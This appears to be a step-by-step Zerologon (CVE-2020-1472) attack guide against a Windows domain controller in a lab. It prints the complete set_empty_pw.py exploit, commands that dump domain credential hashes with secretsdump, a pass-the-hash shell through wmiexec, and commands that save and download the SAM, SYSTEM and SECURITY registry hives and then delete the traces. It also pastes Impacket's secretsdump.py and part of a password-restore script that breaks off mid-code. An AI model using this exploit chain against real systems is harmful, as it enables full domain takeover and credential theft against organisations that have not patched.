# ZEROLOGON Instructions:

## Before you begin:

1. you need the Domain Name for the Windows Domain Controller you are attacking.
2. you need the NetBIOS Name (PC name) for the Windows Domain Controller you are attacking.
3. you need the IP address for the Windows Domain Controller you are attacking.
4. need the exploit code
  - https://github.com/risksense/zerologon/blob/master/set_empty_pw.py
  - https://www.youtube.com/watch?v=6xMGsdD-ArI

**That is all!!**

## set_empty_pw.py
[Contents:](https://raw.githubusercontent.com/risksense/zerologon/master/set_empty_pw.py)
```python3
#!/usr/bin/env python3

from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto
from impacket.dcerpc.v5.ndr import NDRCALL

import hmac, hashlib, struct, sys, socket, time
from binascii import hexlify, unhexlify
from subprocess import check_call
from Cryptodome.Cipher import DES, AES, ARC4
from struct import pack, unpack

# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
MAX_ATTEMPTS = 2000 # False negative chance: 0.04%

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def fail(msg):
  print(msg, file=sys.stderr)
  print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
  sys.exit(2)

def try_zero_authenticate(dc_handle, dc_ip, target_computer):
  # Connect to the DC's Netlogon service.
  binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
  rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
  rpc_con.connect()
  rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

  # Use an all-zero challenge and credential.
  plaintext = b'\x00' * 8
  ciphertext = b'\x00' * 8

  # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled. 
  flags = 0x212fffff

  # Send challenge and authentication request.
  serverChallengeResp = nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
  serverChallenge = serverChallengeResp['ServerChallenge']
  try:
    server_auth = nrpc.hNetrServerAuthenticate3(
      rpc_con, dc_handle + '\x00', target_computer+"$\x00", nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
      target_computer + '\x00', ciphertext, flags
    )

    
    # It worked!
    assert server_auth['ErrorCode'] == 0
    print()
    server_auth.dump()
    print("server challenge", serverChallenge)
    #sessionKey = nrpc.ComputeSessionKeyAES(None,b'\x00'*8, serverChallenge, unhexlify("c9a22836bc33154d0821568c3e18e7ff")) # that ntlm is just a randomly generated machine hash from a lab VM, it's not sensitive
    #print("session key", sessionKey)

    try:
      IV=b'\x00'*16
      #Crypt1 = AES.new(sessionKey, AES.MODE_CFB, IV)
      #serverCred = Crypt1.encrypt(serverChallenge)
      #print("server cred", serverCred)
      #clientCrypt = AES.new(sessionKey, AES.MODE_CFB, IV)
      #clientCred = clientCrypt.encrypt(b'\x00'*8)
      #print("client cred", clientCred)
      #timestamp_var = 10
      #clientStoredCred =  pack('<Q', unpack('<Q', b'\x00'*8)[0] + timestamp_var)
      #print("client stored cred", clientStoredCred)
      authenticator = nrpc.NETLOGON_AUTHENTICATOR()
      #authenticatorCrypt = AES.new(sessionKey, AES.MODE_CFB, IV)
      #authenticatorCred = authenticatorCrypt.encrypt(clientStoredCred);
      #print("authenticator cred", authenticatorCred)
      authenticator['Credential'] = ciphertext #authenticatorCred
      authenticator['Timestamp'] = b"\x00" * 4 #0 # timestamp_var
      #request = nrpc.NetrLogonGetCapabilities()
      #request['ServerName'] = '\x00'*20
      #request['ComputerName'] = target_computer + '\x00'
      #request['Authenticator'] = authenticator
      #request['ReturnAuthenticator']['Credential'] = b'\x00' * 8
      #request['ReturnAuthenticator']['Timestamp'] = 0 
      #request['QueryLevel'] = 1
      #resp = rpc_con.request(request)
      #resp.dump()
      
      request = nrpc.NetrServerPasswordSet2()
      request['PrimaryName'] = NULL
      request['AccountName'] = target_computer + '$\x00'
      request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
      request['ComputerName'] = target_computer + '\x00'
      request["Authenticator"] = authenticator
      #request['ReturnAuthenticator']['Credential'] = b'\x00' * 8
      #request['ReturnAuthenticator']['Timestamp'] = 0
      request["ClearNewPassword"] = b"\x00"*516
      resp = rpc_con.request(request)
      resp.dump()

      #request['PrimaryName'] = NULL
      #request['ComputerName'] = target_computer + '\x00'
      #request['OpaqueBuffer'] = b'HOLABETOCOMOANDAS\x00'
      #request['OpaqueBufferSize'] = len(b'HOLABETOCOMOANDAS\x00')
      #resp = rpc_con.request(request)
      #resp.dump()      
    except Exception as e:
      print(e)
    return rpc_con

  except nrpc.DCERPCSessionError as ex:
    #print(ex)
    # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
    if ex.get_error_code() == 0xc0000022:
      return None
    else:
      fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
  except BaseException as ex:
    fail(f'Unexpected error: {ex}.')


def perform_attack(dc_handle, dc_ip, target_computer):
  # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
  print('Performing authentication attempts...')
  rpc_con = None
  for attempt in range(0, MAX_ATTEMPTS):  
    rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)
    
    if rpc_con == None:
      print('=', end='', flush=True)
    else:
      break

  if rpc_con:
    print('\nSuccess! DC should now have the empty string as its machine password.')
  else:
    print('\nAttack failed. Target is probably patched.')
    sys.exit(1)


if __name__ == '__main__':
  if not (3 <= len(sys.argv) <= 4):
    print('Usage: set_empty_pw.py <dc-name> <dc-ip>\n')
    print('Sets a machine account password to the empty string.')
    print('Note: dc-name should be the (NetBIOS) computer name of the domain controller.')
    sys.exit(1)
  else:
    [_, dc_name, dc_ip] = sys.argv

    dc_name = dc_name.rstrip('$')
    perform_attack('\\\\' + dc_name, dc_ip, dc_name)
```

## Nmap to the rescue:
### Find the DC specifically:
All domain controllers listen on port 389

```
sudo nmap -p389 -sV 192.168.1.28
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-15 22:25 PDT
Nmap scan report for 192.168.1.28
Host is up (0.00037s latency).

PORT    STATE SERVICE VERSION
389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: zerologon.learn.now, Site: Default-First-Site-Name)
MAC Address: 08:00:27:AA:C2:F6 (Oracle VirtualBox virtual NIC)
Service Info: Host: ZEROLOGON-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.45 seconds
```

## In Our Example:
1. Domain Name = ZEROLOGON
2. NetBIOS Name = ZEROLOGON-DC
3. IP address = 192.168.1.28

## change directory to the zerologon exploit folder:

```
cd ~/zerologon
```

## 1st run set_empty_pw.py to exploit the machine:

this will set the password to an empty string

python3 set_empty_pw.py \<NetBIOS-name\> \<IP-Address\>
```
python3 set_empty_pw.py ZEROLOGON-DC 192.168.1.28
```
looking for:

Success! DC should now have the empty string as its machine password.


## 2nd run secretsdump.py to dump the hashes:
secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 \<Domain\>/\<NETBIOS-name\>\\$@\<IP-Address\>

it is important to have \$@ in between the NetBIOS name and the IP 

```
secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 ZEROLOGON/ZEROLOGON-DC\$@192.168.1.28
```

looking for:

Administrator:500:aad3b435b51404eeaad3b435b51404ee:06ebd4bf3fa4fe306259c45e389dc976:::


## 3rd run wmiexec.py to get terminal on victim machine:

wmiexec.py \<Domain\>/\<user-name\>@\<IP-Address\> -hashes \<administrator-hash\>

```
wmiexec.py ZEROLOGON/Administrator@192.168.1.28 -hashes aad3b435b51404eeaad3b435b51404ee:06ebd4bf3fa4fe306259c45e389dc976
```

Looking for:

C:\\>


## Commands to run once on victim machine:
```
verify who you are logged in as:
C:\>whoami
zerologon\administrator

verify the system you are logged into:
C:\>hostname
ZEROLOGON-DC

Prep logon credentials for download:
C:\>reg save HKLM\SYSTEM system.save
The operation completed successfully.

C:\>reg save HKLM\SAM sam.save
The operation completed successfully.

C:\>reg save HKLM\SECURITY security.save
The operation completed successfully.

Download logon credentials:
C:\>get system.save
[*] Downloading C:\\system.save

C:\>get sam.save
[*] Downloading C:\\sam.save

C:\>get security.save
[*] Downloading C:\\security.save

Clean up:
C:\>del /f system.save
C:\>del /f sam.save
C:\>del /f security.save
```

## Exit out and go back to Linux terminal: 

```
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

Looking for:

Administrator:500:aad3b435b51404eeaad3b435b51404ee:06ebd4bf3fa4fe306259c45e389dc976:::

### secretsdump.py
https://raw.githubusercontent.com/fortra/impacket/master/examples/secretsdump.py
```
#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright (C) 2023 Fortra. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   Performs various techniques to dump hashes from the
#   remote machine without executing any agent there.
#   For SAM and LSA Secrets (including cached creds)
#   we try to read as much as we can from the registry
#   and then we save the hives in the target system
#   (%SYSTEMROOT%\\Temp dir) and read the rest of the
#   data from there.
#   For NTDS.dit we either:
#       a. Get the domain users list and get its hashes
#          and Kerberos keys using [MS-DRDS] DRSGetNCChanges()
#          call, replicating just the attributes we need.
#       b. Extract NTDS.dit via vssadmin executed  with the
#          smbexec approach.
#          It's copied on the temp dir and parsed remotely.
#
#   The script initiates the services required for its working
#   if they are not available (e.g. Remote Registry, even if it is
#   disabled). After the work is done, things are restored to the
#   original state.
#
# Author:
#   Alberto Solino (@agsolino)
#
# References:
#   Most of the work done by these guys. I just put all
#   the pieces together, plus some extra magic.
#
#   - https://github.com/gentilkiwi/kekeo/tree/master/dcsync
#   - https://moyix.blogspot.com.ar/2008/02/syskey-and-sam.html
#   - https://moyix.blogspot.com.ar/2008/02/decrypting-lsa-secrets.html
#   - https://moyix.blogspot.com.ar/2008/02/cached-domain-credentials.html
#   - https://web.archive.org/web/20130901115208/www.quarkslab.com/en-blog+read+13
#   - https://code.google.com/p/creddump/
#   - https://lab.mediaservice.net/code/cachedump.rb
#   - https://insecurety.net/?p=768
#   - https://web.archive.org/web/20190717124313/http://www.beginningtoseethelight.org/ntsecurity/index.htm
#   - https://www.exploit-db.com/docs/english/18244-active-domain-offline-hash-dump-&-forensic-analysis.pdf
#   - https://www.passcape.com/index.php?section=blog&cmd=details&id=15
#

from __future__ import division
from __future__ import print_function
import argparse
import codecs
import logging
import os
import sys

from impacket import version
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.smbconnection import SMBConnection
from impacket.ldap.ldap import LDAPConnection, LDAPSessionError

from impacket.examples.secretsdump import LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes, \
    KeyListSecrets
from impacket.krb5.keytab import Keytab
try:
    input = raw_input
except NameError:
    pass

class DumpSecrets:
    def __init__(self, remoteName, username='', password='', domain='', options=None):
        self.__useVSSMethod = options.use_vss
        self.__useKeyListMethod = options.use_keylist
        self.__remoteName = remoteName
        self.__remoteHost = options.target_ip
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = options.aesKey
        self.__aesKeyRodc = options.rodcKey
        self.__smbConnection = None
        self.__ldapConnection = None
        self.__remoteOps = None
        self.__SAMHashes = None
        self.__NTDSHashes = None
        self.__LSASecrets = None
        self.__KeyListSecrets = None
        self.__rodc = options.rodcNo
        self.__systemHive = options.system
        self.__bootkey = options.bootkey
        self.__securityHive = options.security
        self.__samHive = options.sam
        self.__ntdsFile = options.ntds
        self.__history = options.history
        self.__noLMHash = True
        self.__isRemote = True
        self.__outputFileName = options.outputfile
        self.__doKerberos = options.k
        self.__justDC = options.just_dc
        self.__justDCNTLM = options.just_dc_ntlm
        self.__justUser = options.just_dc_user
        self.__ldapFilter = options.ldapfilter
        self.__pwdLastSet = options.pwd_last_set
        self.__printUserStatus= options.user_status
        self.__resumeFileName = options.resumefile
        self.__canProcessSAMLSA = True
        self.__kdcHost = options.dc_ip
        self.__options = options

        if options.hashes is not None:
            self.__lmhash, self.__nthash = options.hashes.split(':')

    def connect(self):
        self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)
        if self.__doKerberos:
            self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                               self.__nthash, self.__aesKey, self.__kdcHost)
        else:
            self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)

    def ldapConnect(self):
        if self.__doKerberos:
            self.__target = self.__remoteHost
        else:
            if self.__kdcHost is not None:
                self.__target = self.__kdcHost
            else:
                self.__target = self.__domain

        # Create the baseDN
        if self.__domain:
            domainParts = self.__domain.split('.')
        else:
            domain = self.__target.split('.', 1)[-1]
            domainParts = domain.split('.')
        self.baseDN = ''
        for i in domainParts:
            self.baseDN += 'dc=%s,' % i
        # Remove last ','
        self.baseDN = self.baseDN[:-1]

        try:
            self.__ldapConnection = LDAPConnection('ldap://%s' % self.__target, self.baseDN, self.__kdcHost)
            if self.__doKerberos is not True:
                self.__ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
            else:
                self.__ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                                    self.__aesKey, kdcHost=self.__kdcHost)
        except LDAPSessionError as e:
            if str(e).find('strongerAuthRequired') >= 0:
                # We need to try SSL
                self.__ldapConnection = LDAPConnection('ldaps://%s' % self.__target, self.baseDN, self.__kdcHost)
                if self.__doKerberos is not True:
                    self.__ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
                else:
                    self.__ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                                        self.__aesKey, kdcHost=self.__kdcHost)
            else:
                raise

    def dump(self):
        try:
            if self.__remoteName.upper() == 'LOCAL' and self.__username == '':
                self.__isRemote = False
                self.__useVSSMethod = True
                if self.__systemHive:
                    localOperations = LocalOperations(self.__systemHive)
                    bootKey = localOperations.getBootKey()
                    if self.__ntdsFile is not None:
                    # Let's grab target's configuration about LM Hashes storage
                        self.__noLMHash = localOperations.checkNoLMHashPolicy()
                else:
                    import binascii
                    bootKey = binascii.unhexlify(self.__bootkey)

            else:
                self.__isRemote = True
                bootKey = None
                if self.__ldapFilter is not None:
                    logging.info('Querying %s for information about domain users via LDAP' % self.__domain)
                    try:
                        self.ldapConnect()
                    except Exception as e:
                        logging.error('LDAP connection failed: %s' % str(e))
                try:
                    try:
                        self.connect()
                    except Exception as e:
                        if os.getenv('KRB5CCNAME') is not None and self.__doKerberos is True:
                            # SMBConnection failed. That might be because there was no way to log into the
                            # target system. We just have a last resort. Hope we have tickets cached and that they
                            # will work
                            logging.debug('SMBConnection didn\'t work, hoping Kerberos will help (%s)' % str(e))
                            pass
                        else:
                            raise

                    self.__remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost, self.__ldapConnection)
                    self.__remoteOps.setExecMethod(self.__options.exec_method)
                    if self.__justDC is False and self.__justDCNTLM is False and self.__useKeyListMethod is False or self.__useVSSMethod is True:
                        self.__remoteOps.enableRegistry()
                        bootKey = self.__remoteOps.getBootKey()
                        # Let's check whether target system stores LM Hashes
                        self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
                except Exception as e:
                    self.__canProcessSAMLSA = False
                    if str(e).find('STATUS_USER_SESSION_DELETED') and os.getenv('KRB5CCNAME') is not None \
                        and self.__doKerberos is True:
                        # Giving some hints here when SPN target name validation is set to something different to Off
                        # This will prevent establishing SMB connections using TGS for SPNs different to cifs/
                        logging.error('Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user')
                    else:
                        logging.error('RemoteOperations failed: %s' % str(e))

            # If the KerberosKeyList method is enable we dump the secrets only via TGS-REQ
            if self.__useKeyListMethod is True:
                try:
                    self.__KeyListSecrets = KeyListSecrets(self.__domain, self.__remoteName, self.__rodc, self.__aesKeyRodc, self.__remoteOps)
                    self.__KeyListSecrets.dump()
                except Exception as e:
                    logging.error('Something went wrong with the Kerberos Key List approach.: %s' % str(e))
            else:
                # If RemoteOperations succeeded, then we can extract SAM and LSA
                if self.__justDC is False and self.__justDCNTLM is False and self.__canProcessSAMLSA:
                    try:
                        if self.__isRemote is True:
                            SAMFileName = self.__remoteOps.saveSAM()
                        else:
                            SAMFileName = self.__samHive

                        self.__SAMHashes = SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote)
                        self.__SAMHashes.dump()
                        if self.__outputFileName is not None:
                            self.__SAMHashes.export(self.__outputFileName)
                    except Exception as e:
                        logging.error('SAM hashes extraction failed: %s' % str(e))

                    try:
                        if self.__isRemote is True:
                            SECURITYFileName = self.__remoteOps.saveSECURITY()
                        else:
                            SECURITYFileName = self.__securityHive

                        self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps,
                                                       isRemote=self.__isRemote, history=self.__history)
                        self.__LSASecrets.dumpCachedHashes()
                        if self.__outputFileName is not None:
                            self.__LSASecrets.exportCached(self.__outputFileName)
                        self.__LSASecrets.dumpSecrets()
                        if self.__outputFileName is not None:
                            self.__LSASecrets.exportSecrets(self.__outputFileName)
                    except Exception as e:
                        if logging.getLogger().level == logging.DEBUG:
                            import traceback
                            traceback.print_exc()
                        logging.error('LSA hashes extraction failed: %s' % str(e))

                # NTDS Extraction we can try regardless of RemoteOperations failing. It might still work
                if self.__isRemote is True:
                    if self.__useVSSMethod and self.__remoteOps is not None and self.__remoteOps.getRRP() is not None:
                        NTDSFileName = self.__remoteOps.saveNTDS()
                    else:
                        NTDSFileName = None
                else:
                    NTDSFileName = self.__ntdsFile

                self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, isRemote=self.__isRemote, history=self.__history,
                                               noLMHash=self.__noLMHash, remoteOps=self.__remoteOps,
                                               useVSSMethod=self.__useVSSMethod, justNTLM=self.__justDCNTLM,
                                               pwdLastSet=self.__pwdLastSet, resumeSession=self.__resumeFileName,
                                               outputFileName=self.__outputFileName, justUser=self.__justUser,
                                               ldapFilter=self.__ldapFilter, printUserStatus=self.__printUserStatus)
                try:
                    self.__NTDSHashes.dump()
                except Exception as e:
                    if logging.getLogger().level == logging.DEBUG:
                        import traceback
                        traceback.print_exc()
                    if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
                        # We don't store the resume file if this error happened, since this error is related to lack
                        # of enough privileges to access DRSUAPI.
                        resumeFile = self.__NTDSHashes.getResumeSessionFile()
                        if resumeFile is not None:
                            os.unlink(resumeFile)
                    logging.error(e)
                    if (self.__justUser or self.__ldapFilter) and str(e).find("ERROR_DS_NAME_ERROR_NOT_UNIQUE") >= 0:
                        logging.info("You just got that error because there might be some duplicates of the same name. "
                                     "Try specifying the domain name for the user as well. It is important to specify it "
                                     "in the form of NetBIOS domain name/user (e.g. contoso/Administratror).")
                    elif self.__useVSSMethod is False:
                        logging.info('Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter')
                self.cleanup()
        except (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(e)
            if self.__NTDSHashes is not None:
                if isinstance(e, KeyboardInterrupt):
                    while True:
                        answer =  input("Delete resume session file? [y/N] ")
                        if answer.upper() == '':
                            answer = 'N'
                            break
                        elif answer.upper() == 'Y':
                            answer = 'Y'
                            break
                        elif answer.upper() == 'N':
                            answer = 'N'
                            break
                    if answer == 'Y':
                        resumeFile = self.__NTDSHashes.getResumeSessionFile()
                        if resumeFile is not None:
                            os.unlink(resumeFile)
            try:
                self.cleanup()
            except:
                pass

    def cleanup(self):
        logging.info('Cleaning up... ')
        if self.__remoteOps:
            self.__remoteOps.finish()
        if self.__SAMHashes:
            self.__SAMHashes.finish()
        if self.__LSASecrets:
            self.__LSASecrets.finish()
        if self.__NTDSHashes:
            self.__NTDSHashes.finish()
        if self.__KeyListSecrets:
            self.__KeyListSecrets.finish()


# Process command-line arguments.
if __name__ == '__main__':
    # Explicitly changing the stdout encoding format
    if sys.stdout.encoding is None:
        # Output is redirected to a file
        sys.stdout = codecs.getwriter('utf8')(sys.stdout)

    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help = True, description = "Performs various techniques to dump secrets from "
                                                      "the remote machine without executing any agent there.")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address> or LOCAL'
                                                       ' (if you want to parse local files)')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-system', action='store', help='SYSTEM hive to parse')
    parser.add_argument('-bootkey', action='store', help='bootkey for SYSTEM hive')
    parser.add_argument('-security', action='store', help='SECURITY hive to parse')
    parser.add_argument('-sam', action='store', help='SAM hive to parse')
    parser.add_argument('-ntds', action='store', help='NTDS.DIT file to parse')
    parser.add_argument('-resumefile', action='store', help='resume file name to resume NTDS.DIT session dump (only '
                         'available to DRSUAPI approach). This file will also be used to keep updating the session\'s '
                         'state')
    parser.add_argument('-outputfile', action='store',
                        help='base output filename. Extensions will be added for sam, secrets, cached and ntds')
    parser.add_argument('-use-vss', action='store_true', default=False,
                        help='Use the VSS method instead of default DRSUAPI')
    parser.add_argument('-rodcNo', action='store', type=int, help='Number of the RODC krbtgt account (only avaiable for Kerb-Key-List approach)')
    parser.add_argument('-rodcKey', action='store', help='AES key of the Read Only Domain Controller (only avaiable for Kerb-Key-List approach)')
    parser.add_argument('-use-keylist', action='store_true', default=False,
                        help='Use the Kerb-Key-List method instead of default DRSUAPI')
    parser.add_argument('-exec-method', choices=['smbexec', 'wmiexec', 'mmcexec'], nargs='?', default='smbexec', help='Remote exec '
                        'method to use at target (only when using -use-vss). Default: smbexec')

    group = parser.add_argument_group('display options')
    group.add_argument('-just-dc-user', action='store', metavar='USERNAME',
                       help='Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. '
                            'Implies also -just-dc switch')
    group.add_argument('-ldapfilter', action='store', metavar='LDAPFILTER',
                       help='Extract only NTDS.DIT data for specific users based on an LDAP filter. '
                            'Only available for DRSUAPI approach. Implies also -just-dc switch')
    group.add_argument('-just-dc', action='store_true', default=False,
                        help='Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)')
    group.add_argument('-just-dc-ntlm', action='store_true', default=False,
                       help='Extract only NTDS.DIT data (NTLM hashes only)')
    group.add_argument('-pwd-last-set', action='store_true', default=False,
                       help='Shows pwdLastSet attribute for each NTDS.DIT account. Doesn\'t apply to -outputfile data')
    group.add_argument('-user-status', action='store_true', default=False,
                        help='Display whether or not the user is disabled')
    group.add_argument('-history', action='store_true', help='Dump password history, and LSA secrets OldVal')

    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                             '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use'
                             ' the ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication'
                                                                            ' (128 or 256 bits)')
    group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')

    group = parser.add_argument_group('connection')
    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                                 'ommited it use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name and you cannot resolve it')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.ts)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, remoteName = parse_target(options.target)

    if options.just_dc_user is not None or options.ldapfilter is not None:
        if options.use_vss is True:
            logging.error('-just-dc-user switch is not supported in VSS mode')
            sys.exit(1)
        elif options.resumefile is not None:
            logging.error('resuming a previous NTDS.DIT dump session not compatible with -just-dc-user switch')
            sys.exit(1)
        elif remoteName.upper() == 'LOCAL' and username == '':
            logging.error('-just-dc-user not compatible in LOCAL mode')
            sys.exit(1)
        else:
            # Having this switch on implies not asking for anything else.
            options.just_dc = True

    if options.use_vss is True and options.resumefile is not None:
        logging.error('resuming a previous NTDS.DIT dump session is not supported in VSS mode')
        sys.exit(1)

    if options.use_keylist is True and (options.rodcNo is None or options.rodcKey is None):
        logging.error('Both the RODC ID number and the RODC key are required for the Kerb-Key-List approach')
        sys.exit(1)

    if remoteName.upper() == 'LOCAL' and username == '' and options.resumefile is not None:
        logging.error('resuming a previous NTDS.DIT dump session is not supported in LOCAL mode')
        sys.exit(1)

    if remoteName.upper() == 'LOCAL' and username == '':
        if options.system is None and options.bootkey is None:
            logging.error('Either the SYSTEM hive or bootkey is required for local parsing, check help')
            sys.exit(1)
    else:

        if options.target_ip is None:
            options.target_ip = remoteName

        if domain is None:
            domain = ''

        if options.keytab is not None:
            Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)
            options.k = True

        if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
            from getpass import getpass

            password = getpass("Password:")

        if options.aesKey is not None:
            options.k = True

    dumper = DumpSecrets(remoteName, username, password, domain, options)
    try:
        dumper.dump()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(e)
```


## Restore the original password:
python3 reinstall_original_pw.py <NetBIOS-name> <IP-Address> <admin-hash>

```
python3 reinstall_original_pw.py ZEROLOGON-DC 192.168.1.28 aad3b435b51404eeaad3b435b51404ee:6d4a95ae230e5ce2c1dbfd780e340cbc
```


### reinstall_original_pw.py
https://raw.githubusercontent.com/risksense/zerologon/master/reinstall_original_pw.py
```
#!/usr/bin/env python3

from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto
from impacket.dcerpc.v5.ndr import NDRCALL
import impacket

import hmac, hashlib, struct, sys, socket, time
from binascii import hexlify, unhexlify
from subprocess import check_call
from Cryptodome.Cipher import DES, AES, ARC4
from struct import pack, unpack

# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
MAX_ATTEMPTS = 2000 # False negative chance: 0.04%


class NetrServerPasswordSet(nrpc.NDRCALL):
    opnum = 6
    structure = (
        ('PrimaryName',nrpc.PLOGONSRV_HANDLE),
        ('AccountName',nrpc.WSTR),
        ('SecureChannelType',nrpc.NETLOGON_SECURE_CHANNEL_TYPE),
        ('ComputerName',nrpc.WSTR),
        ('Authenticator',nrpc.NETLOGON_AUTHENTICATOR),
        ('UasNewPassword',nrpc.ENCRYPTED_NT_OWF_PASSWORD),
    )

class NetrServerPasswordSetResponse(nrpc.NDRCALL):
    structure = (
        ('ReturnAuthenticator',nrpc.NETLOGON_AUTHENTICATOR),
        ('ErrorCode',nrpc.NTSTATUS),
    )

def fail(msg):
  print(msg, file=sys.stderr)
  print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
  sys.exit(2)

def try_zero_authenticate(dc_handle, dc_ip, target_computer, originalpw):
  # Connect to the DC's Netlogon service.
  binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
  rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
  rpc_con.connect()
  rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

  plaintext = b'\x00'*8
  ciphertext = b'\x00'*8
  flags = 0x212fffff

  # Send challenge and authentication request.
  serverChallengeResp = nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
  serverChallenge = serverChallengeResp['ServerChallenge']
  try:
    server_auth = nrpc.hNetrServerAuthenticate3(
      rpc_con, dc_handle + '\x00', target_computer+"$\x00", nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
      target_computer + '\x00', ciphertext, flags
    )

    
    # It worked!
    assert server_auth['ErrorCode'] == 0
    print()
    server_auth.dump()
    print("server challenge", serverChallenge)
    sessionKey = nrpc.ComputeSessionKeyAES(None,b'\x00'*8, serverChallenge, unhexlify("31d6cfe0d16ae931b73c59d7e0c089c0"))
    print("session key", sessionKey)

    try:
      IV=b'\x00'*16
      #Crypt1 = AES.new(sessionKey, AES.MODE_CFB, IV)
      #serverCred = Crypt1.encrypt(serverChallenge)
      #print("server cred", serverCred)
      #clientCrypt = AES.new(sessionKey, AES.MODE_CFB, IV)
      #clientCred = clientCrypt.encrypt(b'\x00'*8)
      #print("client cred", clientCred)
      #timestamp_var = 10
      #clientStoredCred =  pack('<Q', unpack('<Q', b'\x00'*8)[0] + timestamp_var)
      #print("client stored cred", clientStoredCred)
      authenticator = nrpc.NETLOGON_AUTHENTICATOR()
      #authenticatorCrypt = AES.new(sessionKey, AES.MODE_CFB, IV)
      #authenticatorCred = authenticatorCrypt.encrypt(clientStoredCred);
      #print("authenticator cred", authenticatorCred)
      authenticator['Credential'] = ciphertext #authenticatorCred
      authenticator['Timestamp'] = b"\x00" * 4 #0 # timestamp_var
      #request = nrpc.NetrLogonGetCapabilities()
      #request['ServerName'] = '\x00'*20
      #request['ComputerName'] = target_computer + '\x00'
